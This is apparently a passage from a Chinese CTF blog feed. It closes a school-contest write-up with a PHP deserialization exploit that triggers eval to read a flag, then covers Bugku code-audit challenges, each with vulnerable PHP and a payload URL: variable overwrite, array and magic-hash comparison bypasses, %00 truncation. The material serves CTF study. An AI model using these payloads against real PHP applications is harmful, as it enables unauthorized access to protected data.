src="https://s2.ax1x.com/2019/05/01/EJbAi9.png" alt="EJbAi9.png"></p><p>显而易见，在序列化的时候：</p><p>private变量改为了<code>0x00类名0x00变量</code>，在此基础上字符数量也需要修改；</p><p><img src="https://s2.ax1x.com/2019/05/01/EJb2LT.png" alt="EJb2LT.png"></p><p>protected变量改为了<code>0x00*0x00变量</code>，在此基础上字符数量同样需要修改；</p><p><img src="https://s2.ax1x.com/2019/05/01/EJbWeU.png" alt="EJbWeU.png"></p><h4 id="bypass3"><a href="#bypass3" class="headerlink" title="bypass3"></a>bypass3</h4><p>此时就可以直接看<code>__invoke()</code>函数了，因为包含了flag.php，所以猜想里面存在变量<code>$flag</code>，所以在eval内执行如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(global $flag;$ret=$flag;);</span><br></pre></td></tr></table></figure><p>将$flag转化为全局变量，直接赋值$ret，输出即可得到flag；</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var=<span class="string">'$flag'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(</span><br><span class="line">            <span class="string">'global '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span>.</span><br><span class="line">            <span class="string">'$ret = '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'invoke'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回fn()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $fn;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $fn = <span class="keyword">$this</span> -&gt; fn;</span><br><span class="line">        <span class="keyword">return</span> $fn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;obj-&gt;name) || <span class="keyword">$this</span>-&gt;obj-&gt;name != <span class="string">"iv4n"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; obj -&gt; fn = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$gardenia1=<span class="keyword">new</span> P();</span><br><span class="line">$gardenia2=<span class="keyword">new</span> K();</span><br><span class="line">$gardenia2-&gt;fn=$gardenia1;</span><br><span class="line">$gardenia2-&gt;name=<span class="string">'iv4n'</span>;</span><br><span class="line">$gardenia3=<span class="keyword">new</span> U();</span><br><span class="line">$gardenia3-&gt;obj=$gardenia2;</span><br><span class="line">$res=serialize($gardenia3);</span><br><span class="line"><span class="keyword">echo</span>($res);</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;U&quot;:1:&#123;s:3:&quot;obj&quot;;O:1:&quot;K&quot;:2:&#123;s:2:&quot;fn&quot;;O:1:&quot;P&quot;:1:&#123;s:3:&quot;var&quot;;s:5:&quot;$flag&quot;;&#125;s:4:&quot;name&quot;;s:4:&quot;iv4n&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>按照上面的修改即可得到poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj=O:1:&quot;U&quot;:1:&#123;s:3:&quot;obj&quot;;O:1:&quot;K&quot;:2:&#123;s:5:&quot;%00*%00fn&quot;;O:1:&quot;P&quot;:1:&#123;s:6:&quot;%00P%00var&quot;;s:5:&quot;$flag&quot;;&#125;s:4:&quot;name&quot;;s:4:&quot;iv4n&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="https://s2.ax1x.com/2019/05/01/EJqZkQ.png" alt="EJqZkQ.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;萌新入坑的校赛~
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Bugku-Writeup</title>
    <link href="https://gardenia30.top/2018/12/30/BugkuCTFwriteup/"/>
    <id>https://gardenia30.top/2018/12/30/BugkuCTFwriteup/</id>
    <published>2018-12-30T11:55:02.000Z</published>
    <updated>2019-11-10T12:25:59.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>萌新学习~<a id="more"></a></p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'xxx'</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$shiyan</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>和南邮的变量覆盖没什么区别，shiyan和flag作为键名传值；<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/1.php?shiyan=&amp;flag=</span><br></pre></td></tr></table></figure></p><h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">'a'</span>], <span class="variable">$flag</span>) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看见<strong>==</strong>大概率就是弱类型绕过了，strcmp函数是不能处理数组的，直接构造一个数组就可以返回null==0<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/6.php?a[]=1</span><br></pre></td></tr></table></figure></p><h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">"not allowed!"</span>);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Access granted!"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>eregi()函数规定id中不能包含<strong>hackerDJ</strong>，直接将hackerDJ用url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%68%61%63%6B%65%72%44%4A</span><br></pre></td></tr></table></figure></p><p>放进去还是一样，问了一下度娘发现url在$get 进行传参的时候一般都进行了一次解码，所以上面的url编码实际上已经被解码了，直接就弹出了<strong>“not allowed!”</strong>于是将得到的url编码进行二次编码即可:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2568%2561%2563%256B%2565%2572%2544%254A</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/10.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</span><br></pre></td></tr></table></figure></p><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'username'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>同样md5函数也是不可以处理数组的，而且username!=password，<strong>===</strong>是强类型，需要完全一样，类型也必须一样，所以两个null===null，完美….<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$md51</span> = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$md52</span> = @md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="string">'QNKCDZO'</span> &amp;&amp; <span class="variable">$md51</span> == <span class="variable">$md52</span>) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag&#123;*&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="built_in">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>老题，<strong>==</strong>弱类型绕过，<strong>QNKCDZO</strong>的MD5值是<strong>0e</strong>开头解析为0，所以直接找一个a让他的MD5值也为0e开头就好<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/13.php?a=s878926199a</span><br></pre></td></tr></table></figure></p><h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'--'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目要求password中只能出现大小写字母和数字，还必须要出现*–*而且还不是弱类型<strong>!==</strong><br>方法1：strop函数同样也是不能处理数组的直接构造一个数组返回null!==FALSE即可<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/19.php?password[]=1</span><br></pre></td></tr></table></figure></p><p>方法2：构造%00截断，ereg函数只能处理到00之前的字符<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/19.php?password=1%00*--*</span><br></pre></td></tr></table></figure></p><h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line">is_numeric(<span class="variable">$temp</span>)?die(<span class="string">"no numeric"</span>):NULL;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;1336)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p><strong>is_numeric</strong>要求不能是数字，而且要大于1336，用%00跟在数字后会判断为非数字<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/22.php?password=1337%00</span><br></pre></td></tr></table></figure></p><p>这题很奇怪，我用数组试了一下，也是可以的，搞不懂…</p><h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">'name'</span>]);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">'password'</span>]);</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]));</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your password can not be your name!</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Invalid password.</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Login first!</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>sha1函数同样不能处理数组，直接构造两个不相等的数组传进去即可构造<strong>null===null</strong><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">function</span> noother_says_correct(<span class="variable">$temp</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="variable">$one</span> = ord(<span class="string">'1'</span>); //ord — 返回字符的 ASCII 码值</span><br><span class="line"><span class="variable">$nine</span> = ord(<span class="string">'9'</span>); //ord — 返回字符的 ASCII 码值</span><br><span class="line"><span class="variable">$number</span> = <span class="string">'3735929054'</span>;</span><br><span class="line">// Check all the input characters!</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line"><span class="variable">$digit</span> = ord(<span class="variable">$temp</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line"><span class="built_in">return</span> <span class="string">"flase"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$number</span> == <span class="variable">$temp</span>)</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="built_in">echo</span> noother_says_correct(<span class="variable">$temp</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>要求传一个password值进去，password不能是1-9的数字，而且要和3735929054相等，转化为十六进制数:deadc0de<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/20.php?password=0xdeadc0de</span><br></pre></td></tr></table></figure></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"xxx"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You password must be alphanumeric</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'-'</span>) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- have not been found</span></span><br><span class="line"><span class="string">'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Invalid password</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>还是ereg()的%00截断，而且输入的值小于8位，大于9999999，使用科学计数法，输入1e8,00截断*-*即可<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/5.php?password=1e8%00*-*</span><br></pre></td></tr></table></figure></p><h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'ctf'</span>]) === FALSE)</span><br><span class="line"><span 